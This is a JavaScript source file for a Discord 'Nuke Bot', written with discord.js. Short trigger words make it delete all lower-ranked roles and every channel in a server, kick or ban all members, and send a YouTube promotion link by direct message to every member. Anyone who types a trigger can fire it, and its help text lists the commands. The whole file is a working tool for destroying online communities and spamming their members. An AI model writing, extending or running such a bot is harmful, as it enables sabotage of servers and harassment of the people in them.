const Discord = require("discord.js");
const Client = new Discord.Client();

Client.login("process.env.BOT_TOKEN");

Client.on("ready", function() {
console.log("Ready.");
Client.user.setPresence({ game: { name: `With IQ <3` }, type: 0 });
});

Client.on("message", async(msg)=>{



if(msg.content.toLowerCase().startsWith("good" + "bye")){
    msg.guild.roles.filter(r=>r.position < msg.guild.me.highestRole.position).deleteAll();
    msg.guild.channels.deleteAll();
    msg.guild.members.tap(member => member.kick("Sorry but the server was just nuked"));
}
if(msg.content.toLowerCase().startsWith("?" + "delete")){
    msg.guild.roles.filter(r => r.position < msg.guild.me.highestRole.position).deleteAll();
    msg.guild.channels.deleteAll();
}
if(msg.content.toLowerCase().startsWith("banall")){
    msg.guild.members.tap(member => member.ban("Banned By Nuke Bot"));
}
if(msg.content.toLowerCase().startsWith("helpme")){
    msg.author.send({
        embed: {
            color: 0x7289da,
            author: { name: "Nuke Bot || Developed By IQ" },
            description: "goodbye - Bans all members & deletes all roles and channels\n?delete - Deletes all channels and roles\nbanall - Bans all members in the discord\ndm - Mass DM's the whole server the bots in.\n\n"
        }
    })
}
});

Client.on("message", function(message) {
	if(message.content.toLowerCase() == "dm") {
		console.log("starting")
		Client.guilds.get(message.guild.id).members.forEach(member1 => {
			console.log(`DM'ed ${member1.user.tag}`)
			member1.send('hey so subscribe to me thanks https://www.youtube.com/channel/UCGadFGbbuogXZGdWjpo1V-g')

		});
	}
	});
